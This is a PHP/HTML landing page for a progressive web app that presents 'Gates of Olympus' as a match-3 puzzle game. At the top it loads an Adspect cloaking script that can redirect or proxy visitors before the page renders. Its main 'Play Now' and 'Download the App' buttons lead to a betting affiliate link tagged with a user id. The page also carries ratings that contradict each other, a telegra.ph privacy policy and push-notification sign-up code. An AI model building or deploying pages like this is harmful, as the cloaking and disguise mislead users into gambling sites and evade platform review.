<?php
// Prevent Adspect from auto-bootstrapping
if (!defined('ADSPECT_EMBED')) {
    define('ADSPECT_EMBED', true);
}

// Load Adspect script
require_once __DIR__ . '/8dqCjkdMkv.php';

// Use the default SID from the script (matches 8dqCjkdMkv.php configuration)
global $ADSPECT_DEFAULT_SID;
$adspectSid = $ADSPECT_DEFAULT_SID; // '0d07604d-7868-4216-8d2b-f5e91b5c7b44'

// Call adspect() directly - it will handle redirects/exits if needed
// If it returns (data or null), we continue to show the home page
// If it exits (redirect, proxy, etc.), we never reach the HTML below
$adspectData = adspect($adspectSid);

// If we reach here, adspect() returned (didn't exit)
// This means the action was 'local', 'noop', or 'js' mode
// In all cases, we continue to render the home page
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"
    />
    <meta name="theme-color" content="#996E6D" />
    <title>Gates of Olympus</title>
    <link rel="manifest" id="manifest" href="./manifest.json" />
    <link rel="apple-touch-icon" href="./static/icons/icon.png" />
    <link
      rel="stylesheet"
      href="https://unpkg.com/bulma@0.8.0/css/bulma.min.css"
    />
    <link
      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./static/home/css/home.css" />
    <link rel="stylesheet" href="./static/css/dark.css" media="(prefers-color-scheme: dark)" />
    <link rel="stylesheet" href="./static/css/light.css" media="(prefers-color-scheme: light)" />
    <script src="./static/js/ua-parser.js"></script>
    <script
      src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js"
      defer
      onerror="console.warn('OneSignal failed to load - continuing without it')"
    ></script>
    <script>
      if ("serviceWorker" in navigator) {
        navigator.serviceWorker
          .register("./pwabuilder-sw.js", { scope: "./" })
          .catch((err) =>
            console.error("Service worker registration failed:", err)
          );
      }
    </script>
  </head>
  <body>
    <div
      class="header-wrapper"
      id="home"
      style="--hero-image: url('./static/home/images/header.jpg');"
    >
      <section class="hero is-large">
        <div class="hero-body">
          <div class="container has-text-centered">
            <div class="developer-meta" data-aos="fade-up">
              <img
                src="./static/home/images/app-icon.jpg"
                alt="Gates of Olympus icon"
              />
              <span class="name">Gates of Olympus</span>
              <span class="tagline"
                >Gates of Olympus — a spellbinding puzzle adventure with hundreds of dazzling levels.</span
              >
              <div class="rating-badge">
                <span>4.8</span>
                <span class="stars">★ ★ ★ ★ ★</span>
                <span>1M reviews</span>
              </div>
            </div>

            <p class="subtitle" data-aos="fade-up">
              Step into the enchanting world of Gates of Olympus, a match‑3 adventure designed for pure enjoyment. Swap, match, and collect vibrant symbols as you explore handcrafted stages packed with surprises.
            </p>

            <div class="section-light regular-section cta-buttons" data-aos="fade-up">
              <a
                class="btn-primary"
                href="https://betandplay.partners/jf6cbdddf?utm_source=ps-pwa&utm_medium=FRM-145669&pwa_uid={user_id}"
                rel="noopener"
              >
                Play Now
              </a>
              <a
                class="btn-secondary"
                href="https://play.google.com/store/apps/details?id=com.match3cutie.bicgycle&hl=en&gl=us"
                rel="noopener"
                target="_blank"
              >
                View on Google Play
              </a>
            </div>
          </div>
        </div>
      </section>
    </div>

    <div class="main-content">
      <section class="section-dark" data-aos="fade-up">
        <div class="container">
          <div class="columns is-multiline">
            <div class="column is-4">
              <div class="stat">
                <span class="label">Developer</span>
                <span class="value">Zayd Group</span>
                <span class="supporting">Immersive gameplay crafted for puzzle fans</span>
              </div>
            </div>
            <div class="column is-4">
              <div class="stat">
                <span class="label">Installs</span>
                <span class="value">+50,000</span>
                <span class="supporting">Join a vibrant community of players</span>
              </div>
            </div>
            <div class="column is-4">
              <div class="stat">
                <span class="label">Last update</span>
                <span class="value">December 16, 2024</span>
                <span class="supporting">Version 1.4.3</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section class="section-light regular-section" data-aos="fade-up">
        <div class="container has-text-centered">
          <h2 class="section-title">Why You’ll Love It</h2>
          <p class="bodytext">
            This isn’t just another puzzle game—it’s a world filled with joy, creativity, and rewarding challenges. Match, win, and enjoy stunning visuals that make every level unforgettable. Get ready for a magical journey full of prizes, evolving objectives, and steady updates that keep the thrill alive.
          </p>
          <ul class="feature-list-compact">
            <li>
              Hand-crafted levels that steadily increase in difficulty to keep every round exciting.
            </li>
            <li>
              Rich visuals and effects that bring the frosty Olympus realm to life.
            </li>
            <li>
              Accessible gameplay for all ages with intuitive controls and a comfortable pace.
            </li>
            <li>
              Frequent updates and performance polish for a smooth, reliable experience.
            </li>
          </ul>
        </div>
      </section>

      <section class="section-light features" data-aos="fade-up">
        <div class="container">
          <h2 class="section-title has-text-centered">Key Highlights</h2>
          <div class="features-list">
            <div class="feature-card">
              <span class="icon"><i class="bx bx-trophy"></i></span>
              <span class="title">Thrilling Challenges</span>
              <p class="description">
                Sharpen your matching skills and chain victories across action-packed stages.
              </p>
            </div>
            <div class="feature-card">
              <span class="icon"><i class="bx bx-joystick"></i></span>
              <span class="title">Smooth Controls</span>
              <p class="description">
                Responsive design keeps gameplay fast and fluid on every device—no learning curve required.
              </p>
            </div>
            <div class="feature-card">
              <span class="icon"><i class="bx bx-gift"></i></span>
              <span class="title">Ongoing Rewards</span>
              <p class="description">
                Unlock dazzling bonuses, open new chapters, and enjoy special in-game offers.
              </p>
            </div>
            <div class="feature-card">
              <span class="icon"><i class="bx bx-shield-alt"></i></span>
              <span class="title">Safe &amp; Trusted</span>
              <p class="description">
                Enjoy peace of mind thanks to secure data practices and a carefully monitored experience.
              </p>
            </div>
          </div>
        </div>
      </section>

      <section class="section-light regular-section screenshots-grid" data-aos="fade-up">
        <div class="container">
          <h2 class="section-title has-text-centered">In-Game Screenshots</h2>
          <div class="columns is-multiline">
            <div class="column is-4">
              <div class="screenshot">
                <img
                  src="./static/home/images/screenshot1.jpg"
                  alt="Gates of Olympus gameplay screenshot 1"
                />
              </div>
            </div>
            <div class="column is-4">
              <div class="screenshot">
                <img
                  src="./static/home/images/screenshot2.jpg"
                  alt="Gates of Olympus gameplay screenshot 2"
                />
              </div>
            </div>
            <div class="column is-4">
              <div class="screenshot">
                <img
                  src="./static/home/images/screenshot3.jpg"
                  alt="Gates of Olympus gameplay screenshot 3"
                />
              </div>
            </div>
            <div class="column is-4">
              <div class="screenshot">
                <img
                  src="./static/home/images/screenshot4.jpg"
                  alt="Gates of Olympus gameplay screenshot 4"
                />
              </div>
            </div>
            <div class="column is-4">
              <div class="screenshot">
                <img
                  src="./static/home/images/screenshot5.jpg"
                  alt="Gates of Olympus gameplay screenshot 5"
                />
              </div>
            </div>
            <div class="column is-4">
              <div class="screenshot">
                <img
                  src="./static/home/images/screenshot6.jpg"
                  alt="Gates of Olympus gameplay screenshot 6"
                />
              </div>
            </div>
          </div>
        </div>
      </section>

      <section class="section-light regular-section" data-aos="fade-up">
        <div class="container has-text-centered">
          <h2 class="section-title">About the Game</h2>
          <div class="copy">
            <p>
              <strong>Gates of Olympus</strong> delivers a match‑3 experience unlike any other. Explore intricately built stages, treasure-filled bonus rounds, and epic showdowns with Zeus and the heroes of Olympus.
            </p>
            <p>
              Master intuitive controls, collect rewards, and chase achievements through hundreds of evolving levels. Whether you’re new to the genre or a seasoned puzzle pro, there’s always another challenge to conquer.
            </p>
            <p>
              Jump in, uncover hidden secrets, and get ready for a legendary adventure among the clouds!
            </p>
          </div>
          <div class="cta-buttons">
            <a
              class="btn-primary"
              href="https://betandplay.partners/jf6cbdddf?utm_source=ps-pwa&utm_medium=FRM-145669&pwa_uid={user_id}"
            >
              Download the App
            </a>
            <a
              class="btn-secondary"
              href="https://telegra.ph/Match-3-Cutie-12-07"
              target="_blank"
              rel="noopener"
            >
              Privacy Policy
            </a>
          </div>
        </div>
      </section>
    </div>

    <footer class="footer">
      <div class="container">
        <p>
          <a
            href="https://play.google.com/store/apps/details?id=com.match3cutie.bicgycle&hl=en&gl=us"
            target="_blank"
            rel="noopener"
            >Google Play</a
          >
          |
          <a
            href="https://telegra.ph/Match-3-Cutie-12-07"
            target="_blank"
            rel="noopener"
            >Privacy Policy</a
          >
          |
          <a href="mailto:valentinovarumana281@gmail.com"
            >valentinovarumana281@gmail.com</a
          >
        </p>
      </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link
      href="https://cdn.rawgit.com/michalsnik/aos/2.1.1/dist/aos.css"
      rel="stylesheet"
    />
    <script src="https://cdn.rawgit.com/michalsnik/aos/2.1.1/dist/aos.js"></script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        document.body.classList.add("loaded");
        if (window.AOS) {
          AOS.init({
            easing: "ease-out",
            duration: 800,
            once: true,
          });
        }
      });
    </script>
    <script>
      (function () {
        const ONE_SIGNAL_APP_ID = "cbb9cb6a-8723-47b2-9faf-fc00c77c05a1";
        let oneSignalInitializing = false;
        let oneSignalLoadInitialized = false;

        function isIOS() {
          try {
            if (typeof UAParser !== "undefined") {
              return new UAParser().getOS().name === "iOS";
            }
          } catch (e) {
            console.warn("UAParser error:", e);
          }
          return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
        }

        function isStandalone() {
          try {
            return (
              window.navigator.standalone === true ||
              (window.matchMedia &&
                window.matchMedia("(display-mode: standalone)").matches) ||
              (window.matchMedia &&
                window.matchMedia("(display-mode: fullscreen)").matches) ||
              (window.matchMedia &&
                window.matchMedia("(display-mode: minimal-ui)").matches)
            );
          } catch (e) {
            return window.navigator.standalone === true;
          }
        }

        function getOneSignalUserID() {
          let id = localStorage.getItem("onesignaluserid");
          if (!id) {
            id = crypto.randomUUID();
            localStorage.setItem("onesignaluserid", id);
          }
          return id;
        }

        function initOneSignal() {
          return new Promise((resolve, reject) => {
            if (oneSignalInitializing) {
              resolve();
              return;
            }

            if (
              window.OneSignal &&
              window.OneSignal.isPushNotificationsSupported &&
              window.OneSignal.isPushNotificationsSupported()
            ) {
              localStorage.setItem("onesignalSet", "true");
              resolve();
              return;
            }

            if (
              localStorage.getItem("onesignalSet") === "true" &&
              window.OneSignal
            ) {
              resolve();
              return;
            }

            oneSignalInitializing = true;
            window.OneSignalDeferred = window.OneSignalDeferred || [];
            const deferred = window.OneSignalDeferred;

            deferred.push(async function (OneSignal) {
              try {
                await OneSignal.init({
                  appId: ONE_SIGNAL_APP_ID,
                });

                await OneSignal.login(getOneSignalUserID());

                const permission = OneSignal.Notifications.permission;
                const platform = isIOS()
                  ? "iOS"
                  : isStandalone()
                  ? "Android (PWA)"
                  : "Browser";

                if (permission === "granted" || permission === "denied") {
                  localStorage.setItem("onesignalSet", "true");
                  console.log(
                    `OneSignal initialized on ${platform} - permission ${permission}`
                  );
                } else {
                  console.log(
                    `OneSignal initialized on ${platform} - waiting for user permission`
                  );
                }

                if (isIOS() && isStandalone()) {
                  console.log(
                    "iOS PWA detected - push notifications require iOS 16.4+"
                  );
                }

                oneSignalInitializing = false;
                resolve();
              } catch (error) {
                oneSignalInitializing = false;
                if (
                  error.message &&
                  error.message.includes("already initialized")
                ) {
                  localStorage.setItem("onesignalSet", "true");
                  resolve();
                } else {
                  console.error("OneSignal initialization error:", error);
                  reject(error);
                }
              }
            });
          });
        }

        function initializeOneSignalOnLoad() {
          if (oneSignalLoadInitialized) {
            return;
          }

          if (
            window.OneSignal &&
            window.OneSignal.isPushNotificationsSupported &&
            window.OneSignal.isPushNotificationsSupported()
          ) {
            return;
          }

          oneSignalLoadInitialized = true;

          const attemptInit = () => {
            initOneSignal().catch((err) => {
              if (
                !err.message ||
                !err.message.includes("already initialized")
              ) {
                console.warn("OneSignal initialization failed:", err);
              }
            });
          };

          setTimeout(() => {
            if (typeof OneSignal !== "undefined" || window.OneSignalDeferred) {
              attemptInit();
            } else {
              setTimeout(attemptInit, 1000);
            }
          }, 500);
        }

        window.addEventListener(
          "load",
          () => {
            setTimeout(initializeOneSignalOnLoad, 500);
          },
          { capture: true }
        );
      })();
    </script>
  </body>
</html>
